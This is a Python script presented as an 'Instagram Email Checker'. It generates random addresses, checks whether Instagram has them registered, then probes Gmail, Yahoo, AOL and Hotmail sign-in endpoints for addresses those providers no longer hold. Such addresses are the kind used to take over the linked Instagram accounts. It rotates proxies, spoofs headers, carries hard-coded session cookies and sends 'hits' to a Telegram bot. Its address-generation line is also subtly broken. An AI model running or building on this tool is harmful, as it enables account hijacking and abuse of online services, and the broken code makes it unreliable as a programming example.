import requests
import random



print("""

░██████╗░██╗██╗░░░██╗████████╗
██╔════╝░██║██║░░░██║╚══██╔══╝
██║░░██╗░██║╚██╗░██╔╝░░░██║░░░
██║░░╚██╗██║░╚████╔╝░░░░██║░░░
╚██████╔╝██║░░╚██╔╝░░░░░██║░░░
░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░
Instagram Email Checker (;
[ For More info vist My Telegram channel : https://t.me/givtt ]

""")
ss = "1234567890poiuytrewazxsdcvfgbnhjmkl"
Email = ['@hotmail.com','@outlook.com','@outlook.sa']
class givt():
    def __init__(self):
        print("[!] If You want hits save in txt file instead telegram bot let the input is empty [!]")
        self.telegram_token = input('[?] Enter Your bot Token Telegram :')
        self.telegram_id = input('[?] Enter Your Telegram ID :')
        self.done = 0
        self.error = 0
        self.bad = 0
        self.PROXY = []
        try:
            for xxx in open("proxy.txt","r").read().splitlines():
                self.PROXY.append(xxx)
        except FileNotFoundError:
            input('[X] Error [ proxy.txt ] Not Found')
            exit()
        self.check_emails()

    def send_telegram_message(self,hit):
        if self.telegram_token == "" or len(self.telegram_token) == 1:
            F = open('hit.txt','w')
            F.write(hit + "\n")
            F.close()
        else:
            r = requests.get(f"https://api.telegram.org/bot{self.telegram_token}/sendMessage?chat_id={self.telegram_id}&text={hit}")

    def check_emails(self):
        self.r1 = requests.session()
        while True:
            print(f"\r[+] Done:{self.done} | Error :{self.error} | Bad Proxy:{self.bad}",end="")
            p = random.choice(self.PROXY)
            NewProxies = {
                'http': 'http://{}'.format(p),
                'https': 'http://{}'.format(p)}
            self.r1.proxies = NewProxies
            try:
                r = self.r1.get("https://pastebin.com/raw/sMqy3i4W",timeout=5)
                self.email_gmail = str(random.choice(ss) for _ in range(6)) + "@gmail.com"
                self.Rest_password(email=self.email_gmail)
                self.email_hotmail = str(random.choice(ss) for _ in range(6)) + random.choice(Email)
                self.Rest_password(email=self.email_hotmail)
                self.email_yahoo = str(random.choice(ss) for _ in range(6)) + "@yahoo.com"
                self.Rest_password(email=self.email_yahoo)
                self.email_aol = str(random.choice(ss) for _ in range(6)) + "@aol.com"
                self.Rest_password(email=self.email_aol)
            except:
                self.bad+=1

    def Rest_password(self,email):
        url = "https://i.instagram.com/api/v1/users/check_email/"
        headers = {
            "user-agent": "Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)"}
        data = {
            "email":email
        }
        try:
            r = self.r1.post(url,headers=headers,data=data)
            if r.text.find('"available":false')>=0:
                i = str(email)
                Domain = i.split("@")[1]
                if Domain == "gmail.com":
                    self.gmail(email=email)
                elif Domain == "yahoo.com":
                    self.yahoo(email=email)
                elif Domain == "hotmail.com" or Domain == "outlook.com" or Domain == "outlook.sa":
                    self.hotmail(email=email)
                elif Domain == "aol.com":
                    self.aol(email=email)
                else:
                    pass
            else:
                self.error+=1
        except:
            self.bad+=1

    def hotmail(self,email):
        url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
        data = ""
        header = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
            "Connection": "close",
            "Host": "odc.officeapps.live.com",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
            "uaid": "d06e1498e7ed4def9078bd46883f187b",
            "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
        }

        r = self.r1.get(url, data=data, headers=header)
        try:
            if r.text.find('MSAccount') >= 0:
                self.error+=1
            else:
                self.send_telegram_message(email)
                self.done+=1
        except:
            self.bad+=1

    def gmail(self,email):
        url = 'https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=9911&rt=j'
        head = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar',
            'content-length': '3359',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'cookie': '1P_JAR=2021-04-14-23; __Host-GAPS=1:15lCxv-0vaRMtg-xyL7fKuks9WRFgg:cFlDVdSzzej59pDD; NID=213=ZzESKc64qCNDUJ1dhWwoXVuysxbh8tJWSzZ00jtUb7HU8yfnFiavw5f5aVK3j94hsr8_QPcJznpgZ6KPoTgF5MgeAs27w6DH8YUyDhNTSv0KNPLlPp8FaXgDy-HOa6pSqwAMWN-IDcxXqo69q8LKwvRiAvOi9pv0NOtCraXrkhM',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signin/v2/identifier?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2Fb%2F1%2FAddMailService&followup=https%3A%2F%2Faccounts.google.com%2Fb%2F1%2FAddMailService&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
            'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36',
            'x-same-domain': '1'
        }
        data = {
            'continue': 'https://accounts.google.com/b/1/AddMailService',
            'followup': 'https://accounts.google.com/b/1/AddMailService',
            'f.req': f'["{email}","AEThLlxbZ6-x9VsMJvsRJzI_5HjtSNewEnO-bIAsu5YcUp7WlybQO8niGOJ32CWETi9YK0X7vxMkgze_Zf6_ResPRkIQ5KRJmsAK_Eon-20ElwvcPZi6vJ1ZqbG7BpbQR5OLXREgeMGgs9AfAw0HqognB5glmdF8oFsC9J8TDoj19pTL8kPbS3xljUEA8oPcXzS63M7r-Sad",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2Fb%2F1%2FAddMailService&followup=https%3A%2F%2Faccounts.google.com%2Fb%2F1%2FAddMailService",null,[],4,[],"GlifWebSignIn",null,[]],1,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{email}",null,null,null,true,true,[]]',
            'bgRequest': '["identifier","!OTqlOnfNAAZAM0QaQDNClOekYsuKxas7ACkAIwj8RhG5bRq-9fOFv44zT5y2BEfy_kcadEKsN95hF7Hj6NhK4jr8QwIAAABMUgAAABRoAQeZBFFmx2zPIWc7k_F_UKSzr461R6kXNNCMAy6IPUUBE1UAOXoOdDUY8P84VHqEO--_Pt4aFZ7vpP9EtF4yXH7X1e3FkZt9lN91kyrkZ7mqVZgVJx8OP2pVt7BFAgAjQwKjKmwZDjWsmh65vc6Mk-F0DDILlZnMEUm0ldBvUe4elDulA31Nme-5pPhsSLutOQsonzox651DYgw0wSlhc9xiwfUu-X3DNVEEFGwgUGQvTonMyJ_1j6JxOrJLp43KxJQAsakqFggimiDQnJxADBjhLsfxHDKCwfu71KwGWGF4pHwa-dV7ot9WlX8qwt1l2b0JPZQVxDCcsNdX_hsIbcqMD7Cdy5yG9DwAMj8GlxA-th7wCTSVLJyE3ZO8hsb4FY-xATD0VgCYKfxbT6ulWezbrZljVVN54COG_K643MvpCAENjrphn3PGxbcYEMHCFyENLXQU1lwZNMc4fbXkhvxk_7cAMI8CiDUXkK9dC8K17JbotcrXGm8C4IlNtP9MaC-sHzJq07lvsgSaiTv2x5PvQO7YB6RzMLg50r3ROr5IpKi3tZ5w0a2RuPTu0m6tiseFBIekE8Kt1PpBDH710jfz7XjQivQl1o0ftP0Wkvowt2njyQgBXkn2tNCrrtfSxgPyx5lx3_VRb6KdIesI_KwLtfPJC4FOcbcBIbsSbEGHNueaVjtsavNKNxfxn0WXMjYhvi8fupkS6839D9DseKB8-GvURZHA64UtitjqVhWs1cAuIsZbfHYt8LwW-PgA9dMDIma3P16elrkp9q8PEMiFisDblDmko1LEu98jD126Vx_SffyXumxWbID-oxxqCwVckSSFQLt8EuDLCHoaCgDFZWndoDVsVfmLgzU4U3Y3VNFjnuPShFE_3B8Wa4l1okTHEtMlBLH8LBdLl1sNvCFOqKMAizAz-KiP5HIRR-RjHtDdcVYp3rLf0O29CxXh-rh7pZbF1iVuFQl396-iMehfu3EGj6nlB3w0Cp_wpc38GK6csMFQRVXWSmByO3omeftTyrI2_CnIKreUX_OxX2vxcgb6bkPxX6OX8nCWy0qcdPV8OlstfH2gU2UtQCmd2JjtjNfDBcOvDgumytGQqboqA3JgJUYfM1geASn9EdvRxtiE2o2EM_AjSh-G6_3lA6wBbr1dmVLkbtXsYsCbnDxbaIZQi8jDYn2VfNTgqT1Ou2QxKoG7VBQF8w99oBR3NjKxdM_2Q3iGWhpFa09SJwQaKGBrQrqcq3FmTA21oMlt42ZDt5iJtIID5_MMiFPRAfz7k7ZAsXEuRw_x5Npq77-wDjNDTgNKFj2vPoJ66ENrINpl86X7-__ravNPtAgtwtDSH-2C7wfEtHbOYWJ7NB3FtHK0qFW5WsqhJe-Fjx0vGt0O89AhD-g-vthvMU8j_CEXT1_B03dA-P3DFsadazz3bNdLM0HJGgfLyOBWj19oHr02y9WeY3UplqHc3qltmFoqhVXx"]',
            'azt': 'AFoagUVoNP2q7tg-r2bW2IwiK7LNcxJ2XQ:1618443900738',
            'cookiesDisabled': 'false',
            'deviceinfo': '[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,2,null,false,null,""]',
            'gmscoreversion': 'undefined',
            'checkConnection': 'youtube:401:0',
            'checkedDomains': 'youtube',
            'pstMsg': '1'
        }
        try:
            res = self.r1.post(url, data=data, headers=head).text
            if ('[[["gf.alr",16,') in res:
                self.done+=1
                self.send_telegram_message(email)
            elif ('[[["gf.alr",7,') in res:
                self.done += 1
                print(f"\n[+] Done:{email}")
            else:
                self.error+=1
        except:
            self.bad+=1
    def aol(self,email):
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '1523',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'BX=1b42vj5g8mktt&b=3&s=26; GUC=AQEBAQFgjKVglUIcDgRu; A1=d=AQABBL1Ti2ACENobkscxJEwFoiKf-ZlfkBUFEgEBAQGljGCVYAAAAAAA_eMAAAcIvVOLYJlfkBU&S=AQAAAg1vY8DlNy88vuEzORKr02w; A3=d=AQABBL1Ti2ACENobkscxJEwFoiKf-ZlfkBUFEgEBAQGljGCVYAAAAAAA_eMAAAcIvVOLYJlfkBU&S=AQAAAg1vY8DlNy88vuEzORKr02w; A1S=d=AQABBL1Ti2ACENobkscxJEwFoiKf-ZlfkBUFEgEBAQGljGCVYAAAAAAA_eMAAAcIvVOLYJlfkBU&S=AQAAAg1vY8DlNy88vuEzORKr02w&j=WORLD; rxx=2linwi7kfec.2bbayoo5&v=1; cmp=t=1619743677&j=0; spotim_visitId={%22visitId%22:%227f1ca999-7a0f-4227-9a87-6362b7374055%22%2C%22creationDate%22:%222021-04-30T00:47:59.160Z%22%2C%22duration%22:21}; AS=v=1&s=actdNdVk&d=B608ca9fc|TGlLNEn.2SoxcKo7uwbrfIT7smJ.S1WCXCaWY5Q6JxzwyES6EP6Es9_WHPxnTQtlqrD8GjIl.u7BhpStS5yjEv5sbQb0ntlzED5xQ1yhqJt60D4UIGyqx9e17T4wU6zJHls6ygHk5tqBaoux.0lnBq7nFhceD7jvBJ4pildhZJRvfySumMVhzVZyj_.HtnxiAzcWP6rMNEPZbSQC7pbvc1_paXrQUJI1gl.eRfafi8ZRyRJz4FNNNlpCHe9AhipApGREuhhL98TpqRvzqo3dUpF8XhplyA0qqtFlLfF.nnvDzOnOBI2MM57v1ytnuhCVBrb2jtpyGtyZ8IV.iaYl68JOxccoOAKUZAMisHLFbhL2BPM_Gz11Jpn9rNGO..2l1IlB3biQkWPwq.uaUY36LB3zFcwIUFGz.gxn0cL68xuLgEbWQwSINGu9fBNWfJYMTpRJZzB39Pbpxllu1tW4uPGoNLq3SWQxjnkExV3pez_6e74gP6GmacbxnpeqUqLnCtARDg_npneP.5IfIS8QYT1iHf6.hviIUeB1EfIaMVVoSajYWZAWRW7AzjnK7gSVlYD25oyu0k4Z.c6ezlb219W5TwLiuocuOCwLjXmPaojjE62GgffNMDJrROMfbbTjIn7OMyay8FYZleicjD20mGXXNe5GS3WUoqjdhCU8._EqJDZaetD70dHEgkcDfmPwv9ENlo46QYzsExrvVYzIRlExIl0hw3ZZFV5ld97Mfjld6Y17EbD88e.tS_nDOoV_OsHuVuj5.HKKcXgTxVaBkoz_AENpg2ZpAuAkwOntRSZlDypDgFmt0Nk22Klp_p6iQ.5.htaztMuXok3TCNzlvNCGdN4DAha.3tEP23qeIUWyDI53gtIxgfg3~A',
            'Host': 'login.aol.com',
            'Origin': 'https://login.aol.com',
            'Referer': 'https://login.aol.com/?src=fp-us&client_id=dj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2&crumb=UKZxbw6j9tk&intl=us&redirect_uri=https%3A%2F%2Foidc.www.aol.com%2Fcallback&.done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DnjVt4MvPvMf1JE6xXTMCZMRqJfaXjRp8%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

        data = {
            'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":8,"timezoneOffset":-180,"timezone":"Asia/Kuwait","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2070 SUPER Direct3D11 vs_5_0 ps_5_0, D3D11-27.21.14.6589)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":33,"hash":"edeefd360161b4bf944ac045e41d0b21"},"audio":"124.04347527516074","resolution":{"w":"1920","h":"1080"},"availableResolution":{"w":"1040","h":"1920"},"ts":{"serve":1619744892371,"render":1619744891098}}',
            'crumb': 'r77qEhUP8Zi',
            'acrumb': 'actdNdVk',
            'sessionIndex': 'Qg--',
            'displayName': '',
            'deviceCapability': '{"pa":{"status":true}}',
            'username': f'{email}',
            'passwd': '',
            'signin': 'Next',
        }
        try:
            response = self.r1.post("https://login.aol.com/", data=data,headers=headers)
            if response.text.find("Sorry, we don't recognize this email.")>=0:
                self.done+=1
                self.send_telegram_message(email)
            else:
                self.error+=1
        except:
            self.bad+=1
    def yahoo(self,email):
        headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
            'set-cookie': 'AS=v=1&s=TJZ1HqEQ&d=C60838da3|k8W.2P7.2Sp.cT7FDLLCTOqY2d4x23xR3KjHClmPBzoeQwYwX4YInyCRORxt9rLdBRpU1BIv9yM0qo9XEpxfQtSrcRQ9xq_dtMYNO.Kf32lx.C0OfrIiyYdIqToEp54.hvYuR871op7QlfgdRCenDxSx.xPFi_ZU9XXU3XSqS2h8ihgo07fXZ7tzu035tGXgZlowFcurd2k5tSO9up3Mc_mQVWoOB1hzAfTLiiki9sBNtKxsTy6TyjTVl3KHsWuBqZvN3UxBHrp6f6E6uWLMRK.EqckajQhXVyTQ0jJdOmczomW8WRoSXeaAHk_fZ.xhC.e7wq6.6tSO2xBAY32N1Kce5js9ZOo1xDyEOKec1F8MiuCRi8GX1PF7a1NZuJoz9sbLl4n7mTM9sk8CWkQBFi.5LkdEpgYYiEzO_x9Ktioa89iGXfOFY4fBEQIDHTfg6Y2XMkmaW64CWKunhGVW1eP6zC540B3KNFfSFXr09AYgYK261UGFVj8lYGUxofZfVfzCgRznO_nvse5uXzhdeoAHVkWKsnsGj9c_otILHEYDcssbQXLiV3mrgm7blzhAGK0NhfumuMbMb01zge2NeMdgVUzkfctadtZrCWyzGgeMJyi97VK2SeZNiOkQetN.FFP5yYlQknJMx1XNj0FJWjrpwk2KVZ4VNuI1FAvqcux2rgC1n3gpd7gpYeCibOux.a6fL6POqYrQIZxENzpCH4R.Tqf.a8AVYoRYBCL0d0RJ.nW4SxEifDgyDaGs7WZPPm7rxNCuroY2QClz3T0uMLoCiDLcq3UJh626JnypUpIAdruMmT1JxjRFFRCF8W0cmWy9FPo_XFMJGlqYc9OaLUXyhTFfWEIwwBAlGXk_ovk4usoC8Lhp7zLfVjZx0YR6nAhuHNTDqUMi5YixL.RHEpzAC6_3mXf1tgQmWPdhY8FYdRAjSlWtZ3FJVNiyopdad2p_qMBY2p_aL.2DjqDmXfBylEhXpu1Apl_iwsK99DyT_r8y.1vFIx1kUwDddo3n8.NnEGDaY3e8CiUOCOGeRCWu3.Qg.cI3yvcrkfjP2IpfSaZ9_vkx5H7TvHXQiLs-~A; path=/; domain=login.yahoo.com; secure; HttpOnly',
            'Cookie': 'APID=UP89cfaa56-9227-11eb-aa47-029064f2aef3; B=2vmn0mhg68v9u&b=3&s=u0; GUCS=AW-hZd9e; A1=d=AQABBD59ZGACED9JqNh88F9s_ePg_LTg2i8FEgEBBAGMg2BjYdwr0iMA_eMAAAcIPn1kYLTg2i8&S=AQAAAnZYlZQV5U3PJg_y71_mhIc; A3=d=AQABBD59ZGACED9JqNh88F9s_ePg_LTg2i8FEgEBBAGMg2BjYdwr0iMA_eMAAAcIPn1kYLTg2i8&S=AQAAAnZYlZQV5U3PJg_y71_mhIc; A1S=d=AQABBD59ZGACED9JqNh88F9s_ePg_LTg2i8FEgEBBAGMg2BjYdwr0iMA_eMAAAcIPn1kYLTg2i8&S=AQAAAnZYlZQV5U3PJg_y71_mhIc&j=CCPA; GUC=AQEBBAFgg4xhY0IfqwSC; cmp=t=1619147656&j=0; AS=v=1&s=TJZ1HqEQ&d=C60838d9c|2aYcDhv.2So3lB3JvYZ5G4OhSDJJ6rNZfJdX6db41OYAhvYv1GPiLDMFjE2nzSkcbhfCd4vb1pUHDvYxVJ7OCZ1sfAe11PxiBwBe2Elq7v4Raw5B.b7LeUoJgBT6Iout0W6SlNZbxpEATMnPSZ2EdunIS9yPlVoFontY9Lnm.bT4JLOnbhdw6Av1g3mgoJB3gPlTWwBKVzp9SfZuJBWg95MajG27sRvyDeTy0PnIbUha._EZr9lJqsAjn5ETTB3.e3Gn3fCr_myF.y.lRjLSHQQ15vtJ26gkPiGFul8azXu1vJoCTrztp1l0TscBVxDlxvyctCpj2_RBtrTscMHQaDjtMciR5i1hOFcBWVPcs6wMjFOorCDAE9B3X3jK9NP5YOd7ni9wZH36trUOyjK9292bnO7d1sy9x9vqkUuHroh6Irg8r62uWipl9OUDQ6WGoyHlh0WG1jhGHqxa0OcPOphFvejWyaKhQAHiaxmWkipdviIP3ghbg6FcslwMGsLQ2Ik9yOlY4YyI3jCSYp6oF1m6HPj00dzypO1VN5uUI_yo_.XtgLO3sjFbSGXNZjDWGC8tasJIQypSk.Y3fOlm7Laeifem3fU9Wp0tbIZIIqwsGh8wv36L75s1J6vs1PnDyUUdgOa7SRt09V8zEff04yUteYk.ar07TEYQgCj1ebW2MsJsQRdgmZwLqC6BXQxVN7yG7k.VdCmH2Q.w2uuKug17.7iboQSIW0T6SvqV27LVSOqu1vWmO5lJU2HdgHnerDwIjISokKUqvSVE5gobr7QjvQTQhP.eUi7jqHTakbJqBok22mEcfMMD2RCEgh8sTKz3ozGDIsMzacRlKNJad83bIo3CbYaLgq7J19sVrrqeYvj5PVNsqVBu_g.Aqja9AMA5Whky.BGN_aVqnYFpP8ytz2XEzXHEG_9zxFseMuDC~A; APIDTS=1619147808',
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-requested-with": "XMLHttpRequest",
            "referrer": "https://login.yahoo.com/?.lang=en-US&src=homepage&.done=https%3A%2F%2Fwww.yahoo.com%2F%3Fguccounter%3D1&pspid=2023538075&activity=ybar-signin",
            "referrerPolicy": "origin-when-cross-origin"
        }
        data = {
            'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":0,"timezone":"Atlantic/Reykjavik","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"touchSupport":{"points":10,"event":0,"start":0},"fonts":{"count":33,"hash":"edeefd360161b4bf944ac045e41d0b21"},"audio":"124.04347527516074","resolution":{"w":"1024","h":"2014"},"availableResolution":{"w":"1974","h":"1024"},"ts":{"serve":1619147804575,"render":1619147805464}}',
            'crumb': 'jYSZw.MW8BX',
            'acrumb': 'TJZ1HqEQ',
            'sessionIndex': 'Qw--',
            'displayName': '',
            'deviceCapability': '{"pa":{"status":false}}',
            'username': email,
            'passwd': '',
            'signin': 'Next',
            'persistent': 'y'
        }
        url = 'https://login.yahoo.com/?.lang=en-US&src=homepage&.done=https%3A%2F%2Fwww.yahoo.com%2F%3Fguccounter%3D1&pspid=2023538075&activity=ybar-signin'
        try:
            r = self.r1.post(url,headers=headers,data=data)
            if r.text.find('"errorMsg"')>=0:
                self.send_telegram_message(email)
                self.done+=1
            else:
                self.error+=1
        except:
            self.bad+=1

givt()

